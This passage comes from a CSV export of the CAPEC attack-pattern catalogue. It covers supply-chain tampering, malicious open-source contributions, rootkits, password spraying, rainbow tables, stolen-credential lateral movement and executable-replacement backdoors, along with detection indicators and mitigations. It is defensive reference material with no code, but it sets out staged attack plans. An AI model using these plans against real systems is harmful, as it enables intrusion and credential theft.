Hardware Supply Chain::\",\"\",\n532,\"Altered Installed BIOS\",Detailed,Stable,\"An attacker with access to download and update system software sends a maliciously altered BIOS to the victim or victim supplier/integrator, which when installed allows for future exploitation.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"\",\"::Advanced knowledge about the installed target system design.::Advanced knowledge about the download and update installation processes.::Access to the download and update system(s) used to deliver BIOS images.::\",\"::SKILL:Able to develop a malicious BIOS image with the original functionality as a normal BIOS image, but with added functionality that allows for later compromise and/or disruption.:LEVEL:High::\",\"\",\"\",\"\",\"::Deploy strong code integrity policies to allow only authorized apps to run.::Use endpoint detection and response solutions that can automaticalkly detect and remediate suspicious activities.::Maintain a highly secure build and update infrastructure by immediately applying security patches for OS and software, implementing mandatory integrity controls to ensure only trusted tools run, and requiring multi-factor authentication for admins.::Require SSL for update channels and implement certificate transparency based verification.::Sign update packages and BIOS patches.::Use hardware security modules/trusted platform modules to verify authenticity using hardware-based cryptography.::\",\"::An attacker compromises the download and update portion of a manufacturer's web presence, and develops a malicious BIOS that in addition to the normal functionality will also at a specific time of day disable the remote access subsystem's security checks. The malicious BIOS is put in place on the manufacturer's website, the victim location is sent an official-looking email informing the victim of the availability of a new BIOS with bug fixes and enhanced performance capabilities to entice the victim to install the new BIOS quickly. The malicious BIOS is downloaded and installed on the victim's system, which allows for additional compromise by the attacker.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1495:ENTRY NAME:Firmware Corruption::::TAXONOMY NAME:ATTACK:ENTRY ID:1542.001:ENTRY NAME:Pre-OS Boot:System Firmware::\",\"\",\n537,\"Infiltration of Hardware Development Environment\",Detailed,Draft,\"An adversary, leveraging the ability to manipulate components of primary support systems and tools within the development and production environments, inserts malicious software within the hardware and/or firmware development environment. The infiltration purpose is to alter developed hardware components in a system destined for deployment at the victim's organization, for the purpose of disruption or further compromise.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"\",\"::The victim must use email or removable media from systems running the IDE (or systems adjacent to the IDE systems).::The victim must have a system running exploitable applications and/or a vulnerable configuration to allow for initial infiltration.::The adversary must have working knowledge of some if not all of the components involved in the IDE system as well as the infrastructure.::\",\"::SKILL:Intelligence about the manufacturer's operating environment and infrastructure.:LEVEL:Medium::SKILL:Ability to develop, deploy, and maintain a stealth malicious backdoor program remotely in what is essentially a hostile environment.:LEVEL:High::SKILL:Development skills to construct malicious attachments that can be used to exploit vulnerabilities in typical desktop applications or system configurations. The malicious attachments should be crafted well enough to bypass typical defensive systems (IDS, anti-virus, etc):LEVEL:High::\",\"\",\"\",\"\",\"::Verify software downloads and updates to ensure they have not been modified be adversaries::Leverage antivirus tools to detect known malware::Do not download software from untrusted sources::Educate designers, developers, engineers, etc. on social engineering attacks to avoid downloading malicious software via attacks such as phishing attacks::\",\"::The adversary, knowing the manufacturer runs email on a system adjacent to the hardware development systems used for hardware and/or firmware design, sends a phishing email with a malicious attachment to the manufacturer. When viewed, the malicious attachment installs a backdoor that allows the adversary to remotely compromise the adjacent hardware development system from the manufacturer's workstation. The adversary is then able to exfiltrate and alter sensitive data on the hardware system, allowing for future compromise once the developed system is deployed at the victim location.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.003:ENTRY NAME:Supply Chain Compromise: Compromise Hardware Supply Chain::\",\"\",\n538,\"Open-Source Library Manipulation\",Detailed,Stable,\"Adversaries implant malicious code in open source software (OSS) libraries to have it widely distributed, as OSS is commonly downloaded by developers and other users to incorporate into software development projects. The adversary can have a particular system in mind to target, or the implantation can be the first stage of follow-on attacks on many systems.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine the relevant open-source code project to target] The adversary will make the selection based on various criteria: The open-source code currently in use on a selected target system. The depth in the dependency graph of the open source code in relationship to other code bases in use on the target system. Choosing an OSS lower in the graph decreases the probability of discovery, but also decreases the scope of its use within the target system. The programming language in which the open source code is implemented. Different languages present different opportunities for using known software weaknesses. The quality of processes in place to make a contribution. For instance, some contribution sites use static and dynamic analysis tools, which could increase the probability of discovery. The security requirements necessary to make a contribution. For instance, is the ownership lax allowing unsigned commits or anonymous users.::STEP:2:PHASE:Experiment:DESCRIPTION:[Develop a plan for malicious contribution] The adversary develops a plan to contribute malicious code, taking the following into consideration: The adversary will probably avoid easy-to-find software weaknesses, especially ones that static and dynamic analysis tools are likely to discover. Common coding errors or missing edge cases of the algorithm, which can be explained away as being accidental, if discovered, will be preferred by the adversary. Sometimes no identity is required to make a contribution. Other options are to steal an existing identity or create one. When creating a new identity, strike a balance between too little or too much detail. Using an stolen identity could cause a notification to be sent to the actual user.::STEP:3:PHASE:Exploit:DESCRIPTION:[Execute the plan for malicious contribution] Write the code to be contributed based on the plan and then submit the contribution. Multiple commits, possibly using multiple identities, will help obscure the attack. Monitor the contribution site to try to determine if the code has been uploaded to the target system.::\",\"::Access to the open source code base being used by the manufacturer in a system being developed or currently deployed at a victim location.::\",\"::SKILL:Advanced knowledge about the inclusion and specific usage of an open source code project within system being targeted for infiltration.:LEVEL:High::\",\"\",\"\",\"\",\"\",\"::An adversary with access to an open source code project introduces a hard-to-find bug in the software that allows under very specific conditions for encryption to be disabled on data streams. The adversary commits the change to the code which is picked up by a manufacturer who develops VPN software. It is eventually deployed at the victim's location where the very specific conditions are met giving the adversary the ability to sniff plaintext traffic thought to be encrypted. This can provide to the adversary access to sensitive data of the victim.::\",\"::494::829::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.001:ENTRY NAME:Supply Chain Compromise: Software Dependencies and Development Tools::\",\"\",\n539,\"ASIC With Malicious Functionality\",Detailed,Draft,\"An attacker with access to the development environment process of an application-specific integrated circuit (ASIC) for a victim system being developed or maintained after initial deployment can insert malicious functionality into the system for the purpose of disruption or further compromise.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"\",\"::The attacker must have working knowledge of some if not all of the components involved in the target system as well as the infrastructure and development environment of the manufacturer.::Advanced knowledge about the ASIC installed within the target system.::\",\"::SKILL:Able to develop and manufacture malicious subroutines for an ASIC environment without degradation of existing functions and processes.:LEVEL:High::\",\"\",\"\",\"\",\"\",\"::A hardware manufacturer periodically updates its ASIC with new features. The attacker, knowing the manufacturer runs email on a system adjacent to the hardware development systems used for ASIC design, sends a phishing email with a malicious attachment to the manufacturer. When viewed, the malicious attachment installs a backdoor that allows the attacker to remotely compromise the adjacent ASIC development system. The attacker is then able to exfiltrate and alter sensitive data on the ASIC system, allowing for future compromise once a new AISC is deployed at the victim location.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.003:ENTRY NAME:Supply Chain Compromise: Compromise Hardware Supply Chain::\",\"\",\n541,\"Application Fingerprinting\",Standard,Draft,\"An adversary engages in fingerprinting activities to determine the type or version of an application installed on a remote target.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:224::\",\"\",\"::None::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::204::205::208::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1592.002:ENTRY NAME:Gather Victim Host Information: Software::\",\"\",\n542,\"Targeted Malware\",Standard,Draft,\"An adversary develops targeted malware that takes advantage of a known vulnerability in an organizational information technology environment. The malware crafted for these attacks is based specifically on information gathered about the technology environment. Successfully executing the malware enables an adversary to achieve a wide variety of negative technical impacts.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:549::NATURE:CanPrecede:CAPEC ID:662::\",\"\",\"\",\"\",\"\",\"::Software being run on a system matches a file signature found in a malware database::A suspicious module is loaded that is not regularly loaded by a system::Software on a system is making calls to GetProcAddress() which is a commonly used function to implement dynamic API resolution::\",\"\",\"\",\"\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1587.001:ENTRY NAME:Develop Capabilities: Malware::::TAXONOMY NAME:ATTACK:ENTRY ID:1027:ENTRY NAME:Obfuscated Files or Information::\",\"TYPE:Other:NOTE:Adversaries often utilize obfuscation techniques when developing malware with the purpose of either avoiding detection or prevent the target from reverse engineering and understanding a captured malware sample. Some of these techniques include, but are not limited to, binary padding, software packing, stripping symbols and strings from a payload, and utilizing dynamic API resolution.::\",\n543,\"Counterfeit Websites\",Detailed,Draft,\"Adversary creates duplicates of legitimate websites. When users visit a counterfeit site, the site can gather information or upload malware.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:194::NATURE:CanPrecede:CAPEC ID:89::\",\"\",\"::None::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1036.005:ENTRY NAME:Masquerading: Match Legitimate Name or Location::\",\"\",\n545,\"Pull Data from System Resources\",Standard,Draft,\"An adversary who is authorized or has the ability to search known system resources, does so with the intention of gathering useful information. System resources include files, memory, and other aspects of the target system. In this pattern of attack, the adversary does not necessarily know what they are going to find when they start pulling data. This is different than CAPEC-150 where the adversary knows what they are looking for due to the common location.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:116::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"::1239::1243::1258::1266::1272::1278::1323::1258::1330::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1005:ENTRY NAME:Data from Local System::::TAXONOMY NAME:ATTACK:ENTRY ID:1555.001:ENTRY NAME:Credentials from Password Stores:Keychain::\",\"\",\n55,\"Rainbow Table Password Cracking\",Detailed,Draft,\"An attacker gets access to the database table where hashes of passwords are stored. They then use a rainbow table of pre-computed hash chains to attempt to look up the original password. Once the original password corresponding to the hash is obtained, the attacker uses the original password to gain access to the system.\",\"\",Medium,Medium,\"::NATURE:ChildOf:CAPEC ID:49::NATURE:CanPrecede:CAPEC ID:600::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:561::NATURE:CanPrecede:CAPEC ID:653::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine application's/system's password policy] Determine the password policies of the target application/system.:TECHNIQUE:Determine minimum and maximum allowed password lengths.:TECHNIQUE:Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc.).:TECHNIQUE:Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).::STEP:2:PHASE:Explore:DESCRIPTION:[Obtain password hashes] An attacker gets access to the database table storing hashes of passwords or potentially just discovers a hash of an individual password.:TECHNIQUE:Obtain copy of database table or flat file containing password hashes (by breaking access controls, using SQL Injection, etc.):TECHNIQUE:Obtain password hashes from platform-specific storage locations (e.g. Windows registry):TECHNIQUE:Sniff network packets containing password hashes.::STEP:3:PHASE:Exploit:DESCRIPTION:[Run rainbow table-based password cracking tool] An attacker finds or writes a password cracking tool that uses a previously computed rainbow table for the right hashing algorithm. It helps if the attacker knows what hashing algorithm was used by the password system.:TECHNIQUE:Run rainbow table-based password cracking tool such as Ophcrack or RainbowCrack. Reduction function must depend on application's/system's password policy.::\",\"::Hash of the original password is available to the attacker. For a better chance of success, an attacker should have more than one hash of the original password, and ideally the whole table.::Salt was not used to create the hash of the original password. Otherwise the rainbow tables have to be re-computed, which is very expensive and will make the attack effectively infeasible (especially if salt was added in iterations).::The system uses one factor password based authentication.::\",\"::SKILL:A variety of password cracking tools are available that can leverage a rainbow table. The more difficult part is to obtain the password hash(es) in the first place.:LEVEL:Low::\",\"::Rainbow table of password hash chains with the right algorithm used. A password cracking tool that leverages this rainbow table will also be required. Hash(es) of the password is required.::\",\"::This is a completely offline attack that an attacker can perform at their leisure after the password hashes are obtained.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Use salt when computing password hashes. That is, concatenate the salt (random bits) with the original password prior to hashing it.::\",\"::BusyBox 1.1.1 does not use a salt when generating passwords, which makes it easier for local users to guess passwords from a stolen password file using techniques such as rainbow tables. See also: CVE-2006-1058::\",\"::261::521::262::263::654::916::308::309::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1110.002:ENTRY NAME:Brute Force:Password Cracking::\",\"\",\n550,\"Install New Service\",Detailed,Draft,\"When an operating system starts, it also starts programs called services or daemons. Adversaries may install a new service which will be executed at startup (on a Windows system, by modifying the registry). The service name may be disguised by using a name from a related operating system or benign software. Services are usually run with elevated privileges.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:542::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::Limit privileges of user accounts so new service creation can only be performed by authorized administrators.::\",\"\",\"::284::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1543:ENTRY NAME:Create or Modify System Process::\",\"\",\n551,\"Modify Existing Service\",Detailed,Draft,\"When an operating system starts, it also starts programs called services or daemons. Modifying existing services may break existing services or may enable services that are disabled/not commonly used.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:542::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::Limit privileges of user accounts so service changes can only be performed by authorized administrators. Also monitor any service changes that may occur inadvertently.::\",\"\",\"::284::522::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1543:ENTRY NAME:Create or Modify System Process::\",\"\",\n552,\"Install Rootkit \",Detailed,Draft,\"An adversary exploits a weakness in authentication to install malware that alters the functionality and information provide by targeted operating system API calls. Often referred to as rootkits, it is often used to hide the presence of programs, files, network connections, services, drivers, and other system components.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:542::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::Prevent adversary access to privileged accounts necessary to install rootkits.::\",\"::A rootkit may take the form of a hypervisor. A hypervisor is a software layer that sits between the operating system and the processor. It presents a virtual running environment to the operating system. An example of a common hypervisor is Xen. Because a hypervisor operates at a level below the operating system it can hide its existence from the operating system.::Similar to a rootkit, a bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). Adversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.::\",\"::284::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1014:ENTRY NAME:Rootkit::::TAXONOMY NAME:ATTACK:ENTRY ID:1542.003:ENTRY NAME:Pre-OS Boot:Bootkit::::TAXONOMY NAME:ATTACK:ENTRY ID:1547.006:ENTRY NAME:Boot or Logon Autostart Execution:Kernel Modules and Extensions::\",\"\",\n555,\"Remote Services with Stolen Credentials\",Standard,Stable,\"This pattern of attack involves an adversary that uses stolen credentials to leverage remote services such as RDP, telnet, SSH, and VNC to log into a system. Once access is gained, any number of malicious activities could be performed.\",\"\",,Very High,\"::NATURE:ChildOf:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:151::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::Disable RDP, telnet, SSH and enable firewall rules to block such traffic. Limit users and accounts that have remote interactive login access. Remove the Local Administrators group from the list of groups allowed to login through RDP. Limit remote user permissions. Use remote desktop gateways and multifactor authentication for remote logins.::\",\"::Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). There are other implementations and third-party tools that provide graphical access Remote Services similar to RDS. Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials.::Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). It may be called with the winrm command or by any number of programs such as PowerShell.::\",\"::522::308::309::294::263::262::521::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1021:ENTRY NAME:Remote Services::::TAXONOMY NAME:ATTACK:ENTRY ID:1114.002:ENTRY NAME:Email Collection:Remote Email Collection::::TAXONOMY NAME:ATTACK:ENTRY ID:1133:ENTRY NAME:External Remote Services::\",\"\",\n556,\"Replace File Extension Handlers\",Detailed,Draft,\"When a file is opened, its file handler is checked to determine which program opens the file. File handlers are configuration properties of many operating systems. Applications can modify the file handler for a given file extension to call an arbitrary program when a file with the given extension is opened.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:542::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::Inspect registry for changes. Limit privileges of user accounts so changes to default file handlers can only be performed by authorized administrators.::\",\"\",\"::284::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1546.001:ENTRY NAME:Event Triggered Execution:Change Default File Association::\",\"\",\n558,\"Replace Trusted Executable\",Detailed,Stable,\"An adversary exploits weaknesses in privilege management or access control to replace a trusted executable with a malicious version and enable the execution of malware when that trusted executable is called.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:542::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"::Specific versions of Windows contain accessibility features that may be launched with a key combination before a user has logged in (for example when they are on the Windows Logon screen). On Windows XP and Windows Server 2003/R2, the program (e.g. C:WindowsSystem32utilman.exe) may be replaced with cmd.exe (or another program that provides backdoor access). Then pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over RDP will cause the replaced file to be executed with SYSTEM privileges.::\",\"::284::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1505.005:ENTRY NAME:Server Software Component: Terminal Services DLL::::TAXONOMY NAME:ATTACK:ENTRY ID:1546.008:ENTRY NAME:Event Triggered Execution: Accessibility Features::\",\"\",\n560,\"Use of Known Domain Credentials\",Meta,Stable,\"An adversary guesses or obtains (i.e. steals or purchases) legitimate credentials (e.g. userID/password) to achieve authentication and to perform authorized actions under the guise of an authenticated user or service.\",\"\",High,High,\"::NATURE:CanPrecede:CAPEC ID:151::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Acquire known credentials] The adversary must obtain known credentials in order to access the target system, application, or service.:TECHNIQUE:An adversary purchases breached username/password combinations or leaked hashed passwords from the dark web.:TECHNIQUE:An adversary leverages a key logger or phishing attack to steal user credentials as they are provided.:TECHNIQUE:An adversary conducts a sniffing attack to steal credentials as they are transmitted.:TECHNIQUE:An adversary gains access to a database and exfiltrates password hashes.:TECHNIQUE:An adversary examines outward-facing configuration and properties files to discover hardcoded credentials.::STEP:2:PHASE:Explore:DESCRIPTION:[Determine target's password policy] Determine the password policies of the target system/application to determine if the known credentials fit within the specified criteria.:TECHNIQUE:Determine minimum and maximum allowed password lengths.:TECHNIQUE:Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary).:TECHNIQUE:Determine account lockout policy (a strict account lockout policy will prevent brute force attacks if multiple passwords are known for a single user account).::STEP:3:PHASE:Experiment:DESCRIPTION:[Attempt authentication] Try each credential until the target grants access.:TECHNIQUE:Manually or automatically enter each credential through the target's interface.::STEP:4:PHASE:Exploit:DESCRIPTION:[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system, or to laterally move within a system or application::STEP:5:PHASE:Exploit:DESCRIPTION:[Spoofing] Malicious data can be injected into the target system or into a victim user's system by an adversary. The adversary can also pose as a legitimate user to perform social engineering attacks.::STEP:6:PHASE:Exploit:DESCRIPTION:[Data Exfiltration] The adversary can obtain sensitive data contained within the system or application.::\",\"::The system/application uses one factor password based authentication, SSO, and/or cloud-based authentication.::The system/application does not have a sound password policy that is being enforced.::The system/application does not implement an effective password throttling mechanism.::The adversary possesses a list of known user accounts and corresponding passwords that may exist on the target.::\",\"::SKILL:Once an adversary obtains a known credential, leveraging it is trivial.:LEVEL:Low::\",\"::A list of known credentials.::A custom script that leverages the credential list to launch an attack.::\",\"::Authentication attempts use credentials that have been used previously by the account in question.::Authentication attempts are originating from IP addresses or locations that are inconsistent with the user's normal IP addresses or locations.::Data is being transferred and/or removed from systems/applications within the network.::Suspicious or Malicious software is downloaded/installed on systems within the domain.::Messages from a legitimate user appear to contain suspicious links or communications not consistent with the user's normal behavior.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Authorization:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Leverage multi-factor authentication for all authentication services and prior to granting an entity access to the domain network.::Create a strong password policy and ensure that your system enforces this policy.::Ensure users are not reusing username/password combinations for multiple systems, applications, or services.::Do not reuse local administrator account credentials across systems.::Deny remote use of local admin credentials to log into domain systems.::Do not allow accounts to be a local administrator on more than one system.::Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-2.::Monitor system and domain logs for abnormal credential access.::\",\"::Throughout 2015 and 2016, APT28 — also known as Pawn Storm, Sednit, Fancy Bear, Sofacy, and STRONTIUM — leveraged stolen credentials to infiltrate the Democratic National Committee (DNC), the United States Army, the World Anti-Doping Agency (WADA), the Court of Arbitration for Sport (TAS-CAS), and more. In most cases, the legitimate credentials were obtained via calculated spearphishing, tabnabbing, and DNS attacks targeted at corporate webmail systems. APT28 also executed several watering hole attacks, in addition to exploiting several zero-day vulnerabilities within Flash and Windows. The stolen credentials were then utilized to maintain authenticated access, laterally move within the local network, and exfiltrate sensitive information including DNC emails and personal medical records of numerous athletes. [REF-571]::In early 2019, FIN6 exploited stolen credentials from an organization within the engineering industry to laterally move within an environment via the Windows’ Remote Desktop Protocol (RDP). Multiple servers were subsequently infected with malware to create malware distribution servers, which were used to distribute the LockerGoga ransomware. [REF-573]::\",\"::522::307::308::309::262::263::654::1273::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1078:ENTRY NAME:Valid Accounts::\",\"\",\n561,\"Windows Admin Shares with Stolen Credentials\",Detailed,Draft,\"An adversary guesses or obtains (i.e. steals or purchases) legitimate Windows administrator credentials (e.g. userID/password) to access Windows Admin Shares on a local machine or within a Windows domain.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:653::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:165::NATURE:CanPrecede:CAPEC ID:549::NATURE:CanPrecede:CAPEC ID:545::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Acquire known Windows administrator credentials] The adversary must obtain known Windows administrator credentials in order to access the administrative network shares.:TECHNIQUE:An adversary purchases breached Windows administrator credentials from the dark web.:TECHNIQUE:An adversary leverages a key logger or phishing attack to steal administrator credentials as they are provided.:TECHNIQUE:An adversary conducts a sniffing attack to steal Windows administrator credentials as they are transmitted.:TECHNIQUE:An adversary gains access to a Windows domain system/files and exfiltrates Windows administrator password hashes.:TECHNIQUE:An adversary examines outward-facing configuration and properties files to discover hardcoded Windows administrator credentials.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt domain authentication] Try each Windows administrator credential against the hidden network shares until the target grants access.:TECHNIQUE:Manually or automatically enter each administrator credential through the target's interface.::STEP:3:PHASE:Exploit:DESCRIPTION:[Malware Execution] An adversary can remotely execute malware within the administrative network shares to infect other systems within the domain.::STEP:4:PHASE:Exploit:DESCRIPTION:[Data Exfiltration] The adversary can remotely obtain sensitive data contained within the administrative network shares.::\",\"::The system/application is connected to the Windows domain.::The target administrative share allows remote use of local admin credentials to log into domain systems.::The adversary possesses a list of known Windows administrator credentials that exist on the target domain.::\",\"::SKILL:Once an adversary obtains a known Windows credential, leveraging it is trivial.:LEVEL:Low::\",\"::A list of known Windows administrator credentials for the targeted domain.::\",\"::Data is being transferred and/or removed from administrative network shares.::Suspicious or Malicious software is executed within administrative network shares.::Suspicious or Malicious software is downloaded/installed on systems within the domain.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Authorization:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Do not reuse local administrator account credentials across systems.::Deny remote use of local admin credentials to log into domain systems.::Do not allow accounts to be a local administrator on more than one system.::\",\"::APT32 has leveraged Windows' built-in Net utility to use Windows Administrative Shares to copy and execute remote malware. [REF-579]::In May 2017, APT15 laterally moved within a Windows domain via Windows Administrative Shares to copy files to and from compromised host systems. This further allowed for the remote execution of malware. [REF-578]::\",\"::522::308::309::294::263::262::521::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1021.002:ENTRY NAME:Remote Services:SMB/Windows Admin Shares::\",\"\",\n562,\"Modify Shared File\",Detailed,Draft,\"An adversary manipulates the files in a shared location by adding malicious programs, scripts, or exploit code to valid content. Once a user opens the shared content, the tainted content is executed.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:17::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::Disallow shared content. Protect shared folders by minimizing users that have write access. Use utilities that mitigate exploitation like the Microsoft Enhanced Mitigation Experience Toolkit (EMET) to prevent exploits from being run.::\",\"\",\"::284::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1080:ENTRY NAME:Taint shared content::\",\"\",\n564,\"Run Software at Logon\",Detailed,Draft,\"Operating system allows logon scripts to be run whenever a specific user or users logon to a system. If adversaries can access these scripts, they may insert additional code into the logon script. This code can allow them to maintain persistence or move laterally within an enclave because it is executed every time the affected user or users logon to a computer. Modifying logon scripts can effectively bypass workstation and enclave firewalls. Depending on the access configuration of the logon scripts, either local credentials or a remote administrative account may be necessary.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:542::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::Restrict write access to logon scripts to necessary administrators.::\",\"\",\"::284::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1037:ENTRY NAME:Boot or Logon Initialization Scripts::::TAXONOMY NAME:ATTACK:ENTRY ID:1543.001:ENTRY NAME:Create or Modify System Process: Launch Agent::::TAXONOMY NAME:ATTACK:ENTRY ID:1543.004:ENTRY NAME:Create or Modify System Process: Launch Daemon::::TAXONOMY NAME:ATTACK:ENTRY ID:1547:ENTRY NAME:Boot or Logon Autostart Execution::\",\"\",\n565,\"Password Spraying\",Detailed,Draft,\"In a Password Spraying attack, an adversary tries a small list (e.g. 3-5) of common or expected passwords, often matching the target's complexity policy, against a known list of user accounts to gain valid credentials. The adversary tries a particular password for each user account, before moving onto the next password in the list. This approach assists the adversary in remaining undetected by avoiding rapid or frequent account lockouts. The adversary may then reattempt the process with additional passwords, once enough time has passed to prevent inducing a lockout.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:49::NATURE:CanPrecede:CAPEC ID:600::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:561::NATURE:CanPrecede:CAPEC ID:653::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine target's password policy] Determine the password policies of the target system/application.:TECHNIQUE:Determine minimum and maximum allowed password lengths.:TECHNIQUE:Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary).:TECHNIQUE:Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).::STEP:2:PHASE:Explore:DESCRIPTION:[Select passwords] Pick the passwords to be used in the attack (e.g. commonly used passwords, passwords tailored to individual users, etc.):TECHNIQUE:Select passwords based on common use or a particular user's additional details.:TECHNIQUE:Select passwords based on the target's password complexity policies.::STEP:3:PHASE:Exploit:DESCRIPTION:[Brute force password] Given the finite space of possible passwords dictated by information determined in the previous steps, try each password for all known user accounts until the target grants access.:TECHNIQUE:Manually or automatically enter the first password for each known user account through the target's interface. In most systems, start with the shortest and simplest possible passwords, because most users tend to select such passwords if allowed to do so.:TECHNIQUE:Iterate through the remaining passwords for each known user account.::\",\"::The system/application uses one factor password based authentication.::The system/application does not have a sound password policy that is being enforced.::The system/application does not implement an effective password throttling mechanism.::The adversary possesses a list of known user accounts on the target system/application.::\",\"::SKILL:A Password Spraying attack is very straightforward. A variety of password cracking tools are widely available.:LEVEL:Low::\",\"::A machine with sufficient resources for the job (e.g. CPU, RAM, HD).::Applicable password lists.::A password cracking tool or a custom script that leverages the password list to launch the attack.::\",\"::Many invalid login attempts are coming from the same machine (same IP address) or for multiple user accounts within short succession.::The login attempts use passwords that have been used previously by the user account in question.::Login attempts are originating from IP addresses or locations that are inconsistent with the user's normal IP addresses or locations.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Authorization:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Create a strong password policy and ensure that your system enforces this policy.::Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-2.::Leverage multi-factor authentication for all authentication services and prior to granting an entity access to the domain network.::\",\"::A user selects the phrase Password123 as their password, believing that it would be very difficult to guess. Password Spraying, leveraging a list of commonly used passwords, is used to crack this password and gain access to the account.::The Iranian hacker group APT33 (AKA Holmium, Refined Kitten, or Elfin) carried out numerous Password Spraying attacks in 2019. On average, APT33 targeted 2,000 organizations per month, with upwards of 10 million authentication attempts each day. The majority of these attacks targeted manufacturers, suppliers, or maintainers of industrial control system equipment.::\",\"::521::262::263::654::307::308::309::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1110.003:ENTRY NAME:Brute Force:Password Spraying::\",\"\",\n568,\"Capture Credentials via Keylogger\",Detailed,Draft,\"An adversary deploys a keylogger in an effort to obtain credentials directly from a system's user. After capturing all the keystrokes made by a user, the adversary can analyze the data and determine which string are likely to be passwords or other credential related information.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:569::NATURE:CanPrecede:CAPEC ID:600::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:561::NATURE:CanPrecede:CAPEC ID:653::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine which 